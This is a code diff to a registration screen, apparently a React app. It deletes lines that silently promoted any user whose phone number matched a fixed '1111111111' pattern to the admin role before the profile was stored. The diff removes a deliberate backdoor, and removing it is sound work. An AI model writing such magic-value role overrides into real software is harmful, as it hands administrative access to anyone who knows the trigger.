@@ -106,11 +106,6 @@ export const RegisterScreen = () => {
             }
 
             if (responseData.user) {
-                const digits = data.phone.replace(/[^\d]/g, "");
-                if (digits.endsWith("1111111111") || data.phone.includes("111) 111-11-11")) {
-                    responseData.user.role = "admin";
-                    responseData.user.accountType = "admin";
-                }
                 const normalizedUser = normalizeUserProfile(responseData.user);
                 localStorage.setItem("user", JSON.stringify(normalizedUser));
                 queryClient.setQueryData(
